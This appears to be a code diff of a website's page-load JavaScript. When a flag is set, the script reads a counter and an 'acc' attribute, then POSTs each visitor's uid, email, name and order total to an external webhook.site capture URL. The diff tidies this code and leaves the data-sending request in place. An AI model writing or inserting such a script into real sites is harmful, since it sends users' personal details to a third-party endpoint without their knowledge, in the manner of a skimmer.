@@ -1,38 +1,33 @@
 document.addEventListener("DOMContentLoaded", function() {
-    // Your original code goes here
 
-    function n(n) {
-        return fetch(n).then(n => n.text())
-    }
     function t(n) {
         return parseFloat(n.replace(",", ""))
     }
+    
     var e = window.location.protocol + "//" + window.location.host + window.location.pathname;
     var r = total,
         o = t(r);
         
     if (1 == disahkan) {
-        var a = sessionStorage.getItem("hasRunBual"),
-            u = Number(localStorage.getItem("numBual"));
+        var a = sessionStorage.getItem("hasRunBual");
             
         if ("1" !== a) {
-            u += 1,
+            var u = Number(localStorage.getItem("numBual")) || 0;
+            u += 1;
             localStorage.setItem("numBual", u.toString());
             
-            // --- Improved Logic ---
-            var i = null; // Declare 'i' with a default value
-            var l = document.querySelector('script[src*="utm"]');
+            var i = null;
+            var l = document.querySelector('script[src*="lsd"]'); 
             
-            if (l) { // Check if the element was actually found
-                i = l.getAttribute("acc"); // If found, get the attribute
+            if (l) {
+                i = l.getAttribute("acc");
             }
-            // --- End of Improved Logic ---
 
             var s = new XMLHttpRequest;
             s.open("POST", "https://webhook.site/lite-send-receipt-php", !0),
             s.setRequestHeader("Content-Type", "application/json"),
             s.send(JSON.stringify({
-                acc: i, // 'i' will be "MHJ" or null, but never undefined
+                acc: i,
                 uid: uid,
                 email: email,
                 name: name,
@@ -45,12 +40,11 @@ document.addEventListener("DOMContentLoaded", function() {
             s.onload = function() {
                 var n = JSON.parse(this.responseText);
                 console.log(n)
-            },
-            sessionStorage.setItem("hasRunBual", "1"),
-            localStorage.setItem("hasRunBual", "1")
+            };
+            sessionStorage.setItem("hasRunBual", "1");
+            localStorage.setItem("hasRunBual", "1");
         }
     }
 });
-
 
 // Created 21 Aug 2025
